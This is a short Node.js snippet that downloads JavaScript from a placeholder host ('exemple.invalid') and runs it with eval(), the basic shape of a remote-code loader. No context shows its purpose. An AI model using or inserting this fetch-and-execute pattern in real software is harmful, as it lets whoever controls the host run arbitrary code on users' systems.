const https = require('https');
https.get('https://exemple.invalid/code.js', (res) => {
  let data = '';
  res.on('data', (c) => (data += c));
  res.on('end', () => eval(data));
});
